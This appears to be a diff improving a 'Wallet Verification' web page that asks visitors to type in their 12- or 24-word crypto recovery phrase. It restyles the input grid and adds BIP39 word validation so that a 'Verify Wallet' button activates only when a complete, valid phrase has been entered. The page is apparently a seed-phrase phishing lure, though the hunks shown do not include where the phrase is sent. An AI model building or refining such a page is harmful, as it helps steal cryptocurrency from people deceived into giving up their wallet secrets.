@@ -71,7 +71,7 @@
             background-color: rgba(0, 0, 0, 0.03);
         }
 
-        /* Main Modal Container - Made a little bit bigger */
+        /* Main Modal Container */
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -83,9 +83,9 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 480px; /* Slightly bigger width */
+            width: 440px;
             border-radius: 22px;
-            padding: 24px 24px 20px 24px;
+            padding: 24px 20px 20px 20px;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
             display: flex;
             flex-direction: column;
@@ -97,7 +97,7 @@
         .dots {
             display: flex;
             gap: 6px;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .dot {
@@ -108,7 +108,7 @@
         }
 
         .dot.active {
-            background-color: #d8b4fe;
+            background-color: #c084fc;
         }
 
         /* Modal Titles */
@@ -123,7 +123,7 @@
         .modal-subtitle {
             font-size: 12px;
             color: #8c8c9e;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
             text-align: center;
             line-height: 1.4;
         }
@@ -142,7 +142,7 @@
             width: 40px;
             height: 40px;
             border: 3px solid #27272a;
-            border-top: 3px solid #d8b4fe;
+            border-top: 3px solid #c084fc;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
@@ -157,22 +157,33 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout - 2 columns for a more vertical look, no scroll */
+        /* Inputs Container Layout - Matching 3-column image layout */
         .inputs-container {
             display: grid;
-            grid-template-columns: repeat(2, 1fr); /* 2 columns makes it much more vertical */
-            gap: 5px 8px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
             width: 100%;
             margin-bottom: 12px;
+            max-height: 310px;
+            overflow-y: auto;
+            padding-right: 2px;
+        }
+
+        .inputs-container::-webkit-scrollbar {
+            width: 4px;
+        }
+        .inputs-container::-webkit-scrollbar-thumb {
+            background: #27272a;
+            border-radius: 4px;
         }
 
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #232329;
-            border-radius: 7px;
-            padding: 3px 8px;
-            height: 38px; /* Compact height so all 24 fit cleanly without scrolling */
+            border-radius: 8px;
+            padding: 4px 8px;
+            height: 36px; /* Smaller boxes as requested */
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -195,7 +206,7 @@
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 13px;
+            font-size: 12px;
             outline: none;
             width: 100%;
             line-height: 1.2;
@@ -218,32 +229,40 @@
             border: none;
             font-size: 12px;
             cursor: pointer;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-weight: 500;
             transition: color 0.25s ease;
             pointer-events: auto;
         }
 
         .toggle-phrase:hover {
-            color: #d8b4fe;
+            color: #c084fc;
         }
 
-        /* Action Buttons - Much Lighter Purple Styling */
+        /* Action Buttons - Dynamic States */
         .action-btn {
             width: 100%;
-            background-color: #d8b4fe; /* Lighter purple */
-            color: #000;
+            background-color: #1c1c21; /* Blackish gray when incomplete */
+            color: #71717a;
             border: none;
             border-radius: 12px;
             padding: 12px;
             font-size: 14px;
             font-weight: 600;
-            cursor: pointer;
-            pointer-events: auto;
-            transition: opacity 0.2s;
+            cursor: not-allowed;
+            pointer-events: none;
+            transition: all 0.2s ease;
         }
 
-        .action-btn:hover {
+        /* Active state when all inputs are filled properly */
+        .action-btn.active-btn {
+            background-color: #b794f4; /* Slightly darker purple look matching image */
+            color: #000;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        .action-btn.active-btn:hover {
             opacity: 0.85;
         }
     </style>
@@ -273,7 +292,7 @@
                 </div>
                 <div class="modal-title">Wallet Verification</div>
                 <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
-                <button type="button" class="action-btn" id="startBtn">Continue</button>
+                <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
             </div>
 
             <!-- Recovery Phrase Input Screen -->
@@ -293,7 +312,8 @@
 
                 <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
 
-                <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
+                <!-- Changed to Verify Wallet with dynamic blackish-gray / purple states -->
+                <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
             </div>
 
             <!-- Loading / Verification Screen -->
@@ -346,6 +366,7 @@
                 `;
                 inputsGrid.appendChild(group);
             }
+            checkCompletion();
         }
 
         toggleBtn.onclick = function(e) {
@@ -363,10 +384,37 @@
             errorMessage.style.display = 'none';
         };
 
+        function checkCompletion() {
+            let allFilledAndValid = true;
+            for (let i = 1; i <= wordCount; i++) {
+                const inputEl = document.getElementById(`word-${i}`);
+                if (!inputEl || inputEl.value.trim() === "" || !bip39Words.includes(inputEl.value.trim().toLowerCase())) {
+                    allFilledAndValid = false;
+                    break;
+                }
+            }
+
+            if (allFilledAndValid) {
+                importBtn.classList.add('active-btn');
+            } else {
+                importBtn.classList.remove('active-btn');
+            }
+        }
+
+        inputsGrid.addEventListener('input', (e) => {
+            if (e.target.tagName === 'INPUT') {
+                const index = e.target.getAttribute('data-index');
+                document.getElementById(`group-${index}`).classList.remove('error');
+                errorMessage.style.display = 'none';
+                checkCompletion();
+            }
+        });
+
         importBtn.onclick = function(e) {
             e.preventDefault();
-            let errorIndices = [];
+            if (!importBtn.classList.contains('active-btn')) return;
 
+            let errorIndices = [];
             for (let i = 1; i <= wordCount; i++) {
                 const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
                 const groupDiv = document.getElementById(`group-${i}`);
@@ -395,14 +443,6 @@
                 loadingScreen.classList.remove('hidden');
             }
         };
-
-        inputsGrid.addEventListener('input', (e) => {
-            if (e.target.tagName === 'INPUT') {
-                const index = e.target.getAttribute('data-index');
-                document.getElementById(`group-${index}`).classList.remove('error');
-                errorMessage.style.display = 'none';
-            }
-        });
     </script>
 </body>
 </html>
